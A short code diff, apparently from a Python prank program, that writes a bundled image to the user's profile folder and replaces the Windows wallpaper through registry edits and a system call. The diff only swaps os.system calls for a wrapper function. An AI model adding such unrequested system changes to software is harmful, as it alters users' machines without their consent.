@@ -20,8 +20,8 @@ def ufck():
         sigma.write(bytes(include.images[rand.randint(0,3)]))
 
     # change wallpaper
-    os.system('reg delete "HKCU\Control Panel\Desktop" /v Wallpaper /f')
-    os.system(f'reg add "HKCU\Control Panel\Desktop" /t REG_SZ /v Wallpaper /d "{userProfilePath}\sigma.png" /f')
+    do_command('reg delete "HKCU\Control Panel\Desktop" /v Wallpaper /f')
+    do_command(f'reg add "HKCU\Control Panel\Desktop" /t REG_SZ /v Wallpaper /d "{userProfilePath}\sigma.png" /f')
     ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{userProfilePath}\\sigma.png', 3)
 
 
